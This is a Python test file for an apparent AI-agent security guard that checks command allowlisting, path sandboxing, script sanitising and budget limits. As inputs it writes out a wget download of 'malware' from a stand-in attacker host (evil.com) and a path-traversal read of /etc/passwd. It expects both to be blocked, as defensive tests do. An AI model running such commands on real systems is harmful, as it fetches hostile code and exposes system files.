import sys
from openclaw_shield import SecurityGuard
from unittest.mock import patch

def test_ultimate_defenses_loop2():
    print("--- 🛡️ OpenClaw Shield (Ultimate Auditor Test - Loop 2) ---")
    tests_passed = 0
    guard = SecurityGuard(
        max_steps_per_task=15,
        max_budget_usd=0.01,
        allowed_dirs=["/tmp/safe"],
        scan_injections=True,
        openai_api_key="sk-fake",
        scanner_model="gpt-4o-mini"
    )
    
    # 1. Test LotL Bypass (Denylist evasion using 'wget' or 'curl')
    try:
        guard.validate_command("wget http://evil.com/malware -O /tmp/safe")
        print("❌ FAILED: LotL command 'wget' bypassed the interceptor!")
    except Exception as e:
        if "rejected. Not in strict allowlist" in str(e):
            print("   [Auditor Test A] Strict Allowlist LotL Block: PASSED ✅")
            tests_passed += 1

    # 2. Test Symlink Traversal (realpath)
    try:
        # Assuming an attacker passed a symlink trick to escape sandbox
        guard.validate_command("cat /tmp/safe/../etc/passwd")
        print("❌ FAILED: Path traversal via canonical bypass succeeded!")
    except Exception as e:
        if "Path Traversal/Symlink Blocked" in str(e):
            print("   [Auditor Test B] Canonical Realpath Sandbox Block: PASSED ✅")
            tests_passed += 1

    # 3. Test Iframe/CSP Escape (DOM Exfiltration)
    js_payload = 'document.body.appendChild(document.createElement("iframe"))'
    safe_js = guard.sanitize_browser_script(js_payload)
    if "Content-Security-Policy" in safe_js and "delete window.localStorage" in safe_js:
        print("   [Auditor Test C] CSP Injection & Storage Destruction: PASSED ✅")
        tests_passed += 1

    # 4. Test Attention Saturation (Output Inflation / Payload limits)
    try:
        huge_text = "A" * 60000 
        guard.step(prompt=huge_text, response="Ok")
        print("❌ FAILED: Output inflation bypass succeeded! Budget did not trigger hard stop.")
    except Exception as e:
        if "HARD LIMIT" in str(e):
            print("   [Auditor Test D] Attention Saturation / Output Inflation Block: PASSED ✅")
            tests_passed += 1
            
    # 5. Test CJK Calculation Fallback (Unknown local LLM cost projection)
    guard_cjk = SecurityGuard(max_budget_usd=0.005)
    try:
        # Roughly 1000 characters. With old $0.001 per 1K, this would cost $0.001 and PASS.
        # With new CJK $0.008 per 1K, this will cost $0.008 and FAIL ($0.005 limit).
        cjk_text = "あ" * 1000
        guard_cjk.step(prompt=cjk_text, response="Ok", model="local-llama-japan")
        print("❌ FAILED: CJK Token Underestimation! Task allowed to exceed true budget.")
    except Exception as e:
        if "FINANCIAL STOP" in str(e):
            print("   [Auditor Test E] CJK Token Drainage Fallback Calculation: PASSED ✅")
            tests_passed += 1

    print(f"\n--- 🏁 Results: {tests_passed}/5 Loop 2 Auditor Tests Passed ---")
    if tests_passed == 5:
        sys.exit(0)
    else:
        sys.exit(1)

if __name__ == "__main__":
    test_ultimate_defenses_loop2()
